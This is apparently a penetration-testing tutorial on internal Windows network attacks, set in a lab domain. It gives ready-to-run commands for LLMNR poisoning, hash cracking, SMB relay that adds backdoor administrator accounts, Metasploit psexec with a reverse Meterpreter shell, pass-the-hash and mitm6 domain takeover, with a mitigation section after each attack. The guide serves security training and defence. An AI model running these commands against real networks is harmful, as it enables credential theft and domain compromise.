# Internal Network Attacks – Comprehensive Guide

## Overview

This guide covers common internal network attacks that exploit Windows authentication protocols and network services. These attacks are particularly effective in Active Directory environments and are frequently used in penetration testing and red teaming.

---

## LLMNR Poisoning

### What is LLMNR?

**LLMNR (Link-Local Multicast Name Resolution)** is a protocol used by Windows to resolve hostnames when DNS resolution fails. It's designed for small networks without DNS servers, but it's often enabled by default on enterprise networks, creating a significant security vulnerability.

**How LLMNR Works:**

1. User tries to access a resource (e.g., `\\FILESERVER`)
2. DNS lookup fails (server doesn't exist or DNS is down)
3. Computer sends LLMNR query to all devices on the local network
4. The device with that name responds
5. **Security Issue:** Any device can respond, including attackers

**The Attack Vector:**

| Step | Description |
|------|-------------|
| 1 | Attacker monitors network traffic for LLMNR requests |
| 2 | When a request is seen, attacker responds claiming to be the target |
| 3 | Victim attempts to authenticate to the attacker |
| 4 | Attacker captures the NTLM hash from the authentication attempt |
| 5 | Attacker can crack the hash or use it for pass-the-hash attacks |

### Capturing Hashes with Responder

**What is Responder?**

**Responder** is a tool designed to poison LLMNR, NBT-NS, and MDNS requests. It responds to name resolution queries and captures authentication hashes.

**Basic Responder Command:**

```bash
sudo responder -I eth0 -dwP
```

**Command Breakdown:**

| Parameter | Description |
|-----------|-------------|
| `-I eth0` | Interface to listen on (replace with your interface) |
| `-d` | Answer DHCP broadcast requests |
| `-w` | Start WPAD rogue proxy server |
| `-P` | Force authentication for the WPAD proxy |

**What is WPAD?**

**WPAD (Web Proxy Auto-Discovery Protocol)** allows browsers to automatically detect proxy settings. Attackers can exploit this by setting up a rogue proxy server that forces authentication, capturing credentials.

### Practical LLMNR Poisoning Attack

**Step 1: Start Responder**

```bash
sudo responder -I eth0 -dwP
```

**Step 2: Trigger Authentication from Target**

On the target machine, attempt to access the attacker's machine:

```
\\192.168.138.134
```

This can be done through:
- File Explorer
- Run dialog (Win+R)
- Command Prompt

**Step 3: Capture the Hash**

Responder will display the captured NTLM hash:

```
[+] Listening for events...
[*] Captured NTLMv2 Hash:
MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:0101000000000000c0cf...
```

### Cracking Captured Hashes with Hashcat

**What is Hashcat?**

**Hashcat** is a password recovery tool that uses GPU acceleration to crack password hashes. It's one of the fastest password cracking tools available.

**Step 1: Identify the Hash Type**

If you're unsure about the hash type, use `hash-identifier`:

```bash
hash-identifier
```

Paste your hash and it will identify the type.

**Step 2: Find the Hashcat Mode**

Search for NTLM modes:

```bash
hashcat --help | grep ntlm
```

Common NTLM modes:
- `5600` - NTLMv2
- `1000` - NTLM

**Step 3: Crack the Hash**

Basic cracking command:

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Command Breakdown:**

| Parameter | Description |
|-----------|-------------|
| `-m 5600` | Hash mode (5600 = NTLMv2) |
| `hashes.txt` | File containing captured hashes |
| `/usr/share/wordlists/rockyou.txt` | Password wordlist |

**Useful Hashcat Options:**

```bash
# Show only cracked passwords
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show

# Force hashcat to run (ignore warnings)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Use rule-based password mutations
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r OneRule
```

**What are Rules?**

**Rules** in Hashcat are files that define how to mutate passwords from your wordlist. For example, adding numbers, special characters, or capitalizing letters. This helps crack passwords that are variations of common passwords.

### LLMNR Poisoning Mitigation

**Primary Defense: Disable LLMNR**

1. Open **Group Policy Management**
2. Navigate to: `Computer Configuration > Policies > Administrative Templates > Network > DNS Client`
3. Enable: **Turn off Multicast Name Resolution**
4. Apply the GPO to all computers

**Additional Defenses:**

| Defense | Description |
|---------|-------------|
| **Strong Password Policy** | Makes cracking hashes more difficult |
| **Network Segmentation** | Limits broadcast domain size |
| **MAC Address Filtering** | Restricts which devices can respond (limited effectiveness) |
| **Disable NBT-NS** | Similar protocol with same vulnerabilities |

**Why Disable LLMNR?**

- It's rarely needed in modern networks with proper DNS
- It creates a significant attack surface
- Disabling it has minimal impact on functionality

---

## SMB Relay Attacks

### What is SMB Relay?

**SMB Relay** is an attack where captured NTLM authentication attempts are relayed to another target machine instead of being cracked. This allows attackers to authenticate as the victim without knowing their password.

**How SMB Relay Works:**

1. Attacker captures NTLM authentication attempt (via LLMNR poisoning, etc.)
2. Instead of cracking the hash, attacker relays it to another target
3. Target accepts the authentication (if SMB signing is disabled)
4. Attacker gains access to the target as the victim

**Requirements for SMB Relay:**

| Requirement | Description |
|-------------|-------------|
| **SMB Signing Disabled** | Target must not require SMB signing |
| **Admin Privileges** | Relayed user must have admin rights on target |
| **Network Access** | Attacker must be able to reach the target |
| **Authentication Capture** | Need to capture NTLM authentication first |

### Identifying Vulnerable Targets

**Using Nmap to Check SMB Signing:**

```bash
nmap --script=smb2-security-mode.nse -p445 10.0.0.25
```

**Understanding the Output:**

| Output | Meaning |
|--------|---------|
| `Message signing enabled` | NOT vulnerable to SMB relay |
| `Message signing disabled` | VULNERABLE to SMB relay |
| `Message signing: required` | NOT vulnerable (signing enforced) |

**Additional Nmap Options:**

```bash
# Skip host discovery (when you know the host is up)
nmap --script=smb2-security-mode.nse -p445 10.0.0.25 -Pn
```

**What is `-Pn`?**

`-Pn` (Ping None) tells Nmap to skip host discovery. Use this when you know the host is up but Nmap can't detect it (common with Windows firewalls).

### Setting Up SMB Relay Attacks

**Step 1: Configure Responder**

Edit `/etc/responder/Responder.conf`:

```ini
# Turn OFF SMB and HTTP servers
[SMB]
Off = True

[HTTP]
Off = True
```

**Why Disable SMB and HTTP in Responder?**

We want to **relay** hashes, not capture them. If Responder responds to SMB/HTTP requests, it will capture the hash instead of allowing us to relay it to another target.

**Step 2: Create Targets File**

Create `targets.txt` with vulnerable hosts:

```
10.0.0.25
10.0.0.26
10.0.0.27
```

**Step 3: Start Responder**

```bash
sudo responder -I eth0 -dwPv
```

Verify that SMB and HTTP are OFF in the output.

**Step 4: Start NTLM Relay**

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

**Command Breakdown:**

| Parameter | Description |
|-----------|-------------|
| `-tf targets.txt` | File containing target IPs |
| `-smb2support` | Enable SMB2 protocol support |

**Note:** The working version is `v0.9.19` - older and newer versions may have issues.

### Advanced SMB Relay Techniques

**Interactive Shell Access:**

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

This starts an SMB client on localhost port 11000. Connect to it:

```bash
nc 127.0.0.1 11000
```

**Interactive Commands:**

```
# List available shares
shares

# Connect to ADMIN$ share
use ADMIN$

# List files
ls

# Upload files
put local_file.txt

# Download files
get remote_file.txt
```

**Command Execution:**

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

You can execute any command:

```bash
# Create a user
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Password123 /add"

# Add to administrators
ntlmrelayx.py -tf targets.txt -smb2support -c "net localgroup administrators hacker /add"
```

### SMB Relay Attack Defenses

| Defense | Description | Pros | Cons |
|---------|-------------|------|------|
| **Enable SMB Signing** | Requires all SMB traffic to be signed | Most effective defense | Can impact file copy performance |
| **Disable NTLM** | Force Kerberos authentication | Eliminates NTLM attacks | May break legacy applications |
| **Account Tiering** | Separate admin and user accounts | Limits lateral movement | Requires careful implementation |
| **Local Admin Restriction** | Remove local admin rights | Reduces attack surface | May increase help desk tickets |

**Why Enable SMB Signing?**

SMB signing ensures that SMB traffic cannot be tampered with. When enabled, relayed authentication attempts are rejected because the signature doesn't match.

**Performance Considerations:**

SMB signing can impact file copy performance, especially on older hardware. Test in your environment before widespread deployment.

---

## Gaining Shell Access

### What is Shell Access?

**Shell access** gives you command-line control over a target machine. This is often the goal of penetration testing, as it allows you to run commands, escalate privileges, and move laterally.

### Using Metasploit's psexec

**What is psexec?**

**psexec** is a tool that allows you to execute processes on remote systems. It's part of the Sysinternals suite and is commonly used by administrators and attackers alike.

**Metasploit psexec Module:**

```bash
msfconsole
use exploit/windows/smb/psexec
```

**Configuring the Exploit:**

```bash
# Set payload to 64-bit
set payload windows/x64/meterpreter/reverse_tcp

# Set target
set RHOSTS 192.168.138.137

# Set domain credentials
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass Password1

# Show available targets
show targets

# Run the exploit
run
```

**Session Management:**

```bash
# Background the session
background

# List all sessions
sessions

# Interact with session 1
sessions 1

# Return to meterpreter prompt
sessions -i 1
```

**What is Meterpreter?**

**Meterpreter** is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers. It provides a powerful command-line interface with extensive post-exploitation capabilities.

### Pass-the-Hash Attack

**What is Pass-the-Hash?**

**Pass-the-Hash** allows you to authenticate using a password hash instead of the actual password. This works because Windows stores NTLM hashes and uses them for authentication. Only works with NTLM hash (LM:NT_hash)

**Using Hash with Metasploit:**

```bash
# Configure for hash attack
set smbuser administrator
unset smbdomain
set smbpass LM_hash:NT_hash

# Run the exploit
run
```

**Hash Format:**

```
aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
```

| Part | Description |
|------|-------------|
| `LM_hash` | LAN Manager hash (often empty: `aad3b435b51404eeaad3b435b51404ee`) |
| `NT_hash` | NTLM hash (the one we need) |

### Using Impacket Tools

**What is Impacket?**

**Impacket** is a collection of Python classes for working with network protocols. It's a staple tool for penetration testers and includes many useful scripts.

**psexec.py (Password Authentication):**

```bash
psexec.py MARVEL/fcastle:'Password1'@192.168.138.137
```

**Format:** `DOMAIN/user:'password'@IP_address`

**psexec.py (Hash Authentication):**

```bash
psexec.py administrator@192.168.138.137 -hashes LM_hash:NT_hash
```

**Alternative Tools:**

If psexec is blocked or detected by antivirus:

```bash
# WMI execution
wmiexec.py MARVEL/fcastle:'Password1'@192.168.138.137

# SMB execution
smbexec.py MARVEL/fcastle:'Password1'@192.168.138.137
```

**Tool Comparison:**

| Tool | Protocol | Detection Risk | Features |
|------|----------|----------------|----------|
| **psexec.py** | SMB | High | Full shell access |
| **wmiexec.py** | WMI | Medium | Semi-interactive shell |
| **smbexec.py** | SMB | Medium | Command execution only |

---

## IPv6 Attacks

### What are IPv6 Attacks?

**IPv6 attacks** exploit the fact that many Windows systems have IPv6 enabled but don't have proper IPv6 DNS infrastructure. This allows attackers to spoof IPv6 DNS responses and relay authentication to domain controllers.

**The Problem:**

| Situation | Issue |
|-----------|-------|
| IPv6 enabled | Windows prefers IPv6 over IPv4 |
| No IPv6 DNS | Who handles IPv6 DNS requests? |
| Default behavior | Windows accepts any IPv6 DNS response |

### IPv6 DNS Takeover via mitm6

**What is mitm6?**

**mitm6** is a tool that exploits IPv6 DNS to take over the DNS server for a domain. It's designed to work with ntlmrelayx to relay authentication to LDAP.

**Installation:**

```bash
cd /opt/mitm6
sudo pip2 install .
```

**Setting Up the Attack:**

**Step 1: Configure NTLM Relay for LDAP**

```bash
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
```

**Command Breakdown:**

| Parameter | Description |
|-----------|-------------|
| `-6` | Use IPv6 |
| `-t ldaps://IP` | Target LDAP server (Domain Controller) |
| `-wh fakewpad.marvel.local` | Set up WPAD (machine-in-the-middle) |
| `-l lootme` | Directory to save captured data |

**Step 2: Start mitm6**

```bash
sudo mitm6 -d marvel.local
```

**What Happens:**

1. mitm6 responds to IPv6 DNS requests
2. Windows machines start using the attacker as DNS server
3. Authentication attempts are relayed to LDAP
4. Attacker gains access to domain information

**Captured Data:**

The `lootme` folder will contain:

| Data Type | Description |
|-----------|-------------|
| Domain computers | List of all machines in the domain |
| Domain groups | All groups and memberships |
| Domain users | All user accounts |
| Group policies | Security policies and settings |

### Creating a Domain Admin via IPv6 Attack

**The Attack Flow:**

1. mitm6 poisons IPv6 DNS
2. ntlmrelayx relays authentication to LDAP
3. When an admin logs in, mitm6 creates a new user
4. The new user is added to Enterprise Admins
5. Attacker now has domain admin access

**Example Output:**

```
[*] Creating new user: mitm6_admin
[*] Password: P@ssw0rd123!
[*] Adding user to Enterprise Admins group
[*] Success! User has domain admin privileges
```

**Verification:**

On the Domain Controller:

```powershell
# Check if user exists
Get-ADUser mitm6_admin

# Check group membership
Get-ADGroupMember "Enterprise Admins"
```

### IPv6 Attack Defenses

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Disable IPv6** | Remove IPv6 attack surface | Network configuration |
| **Block IPv6 Traffic** | Filter specific IPv6 protocols | Firewall rules |
| **Disable WPAD** | Remove WPAD attack vector | Group Policy |
| **Enable LDAP Signing** | Prevent LDAP relay | Domain Controller settings |
| **Protected Users Group** | Prevent credential delegation | User account settings |

**Specific Traffic to Block:**

- Inbound DHCPv6
- Inbound Router Advertisements
- Outbound DHCPv6

**Why Disable WPAD?**

WPAD is rarely needed in modern environments and creates a significant attack surface. Disabling it removes a common attack vector.

**LDAP Signing and Channel Binding:**

These security features ensure that LDAP traffic cannot be relayed. They should be enabled on all Domain Controllers.

---

## Passback Attacks

### What are Passback Attacks?

**Passback attacks** exploit the way printers and other network devices handle authentication. These devices often have weak security configurations and can be used to relay authentication attempts.

**Common Targets:**

- Network printers
- Scanners
- Fax machines
- IoT devices

**Attack Vector:**

1. Attacker identifies vulnerable device
2. Triggers authentication to the device
3. Relays authentication to more valuable targets
4. Gains access using device credentials

**For More Information:**

[How to Hack Through a Pass-Back Attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

---

## Initial Internal Attack Strategy

### Recommended Attack Sequence

**Phase 1: Passive Reconnaissance**

```bash
# Start Responder for LLMNR poisoning
sudo responder -I eth0 -dwP

# Start mitm6 for IPv6 attacks
sudo mitm6 -d marvel.local
```

**Phase 2: Active Scanning**

```bash
# Generate network traffic with Nmap
nmap -sV -sC 10.0.0.0/24

# Use Nessus for vulnerability scanning
nessus - scan targets
```

**Phase 3: Web Application Testing**

```bash
# Use Metasploit to identify web services
msfconsole
use auxiliary/scanner/http/http_version
set RHOSTS 10.0.0.0/24
run
```

**Phase 4: Default Credential Testing**

Check for default credentials on:
- Web applications
- Printers
- Network devices
- Services (SSH, RDP, FTP)

**Phase 5: Think Outside the Box**

- Look for misconfigurations
- Check for exposed services
- Test for weak permissions
- Exploit trust relationships

### Key Principles

| Principle | Description |
|-----------|-------------|
| **Start Passive** | Don't alert defenders initially |
| **Generate Traffic** | Scans trigger authentication attempts |
| **Be Patient** | Wait for users to make mistakes |
| **Think Laterally** | Use unexpected attack vectors |
| **Document Everything** | Keep track of what works |

---

## Summary of Attack Techniques

| Attack | Requirements | Impact | Difficulty |
|--------|--------------|--------|------------|
| **LLMNR Poisoning** | LLMNR enabled | Hash capture | Easy |
| **SMB Relay** | SMB signing disabled | System access | Medium |
| **Pass-the-Hash** | Captured hash | Authentication | Easy |
| **IPv6 DNS Takeover** | IPv6 enabled | Domain compromise | Hard |
| **Passback Attack** | Vulnerable devices | Lateral movement | Medium |

---

## Key Technical Terms Glossary

| Term | Definition |
|------|------------|
| **LLMNR** | Link-Local Multicast Name Resolution - fallback name resolution protocol |
| **NTLM** | NT LAN Manager - Windows authentication protocol |
| **NTLM Hash** | Hash of Windows password used for authentication |
| **SMB** | Server Message Block - Windows file sharing protocol |
| **SMB Signing** | Security feature that ensures SMB traffic integrity |
| **WPAD** | Web Proxy Auto-Discovery Protocol - automatic proxy configuration |
| **Responder** | Tool for poisoning LLMNR/NBT-NS requests |
| **Hashcat** | GPU-accelerated password cracking tool |
| **Pass-the-Hash** | Authentication using password hash instead of password |
| **SMB Relay** | Relaying authentication to another target |
| **Meterpreter** | Advanced Metasploit payload with post-exploitation features |
| **Impacket** | Python library for network protocol manipulation |
| **mitm6** | IPv6 DNS takeover tool |
| **LDAP** | Lightweight Directory Access Protocol - directory service protocol |
| **Passback Attack** | Attack exploiting device authentication weaknesses |
| **Enterprise Admins** | Highest privilege group in Active Directory forest |
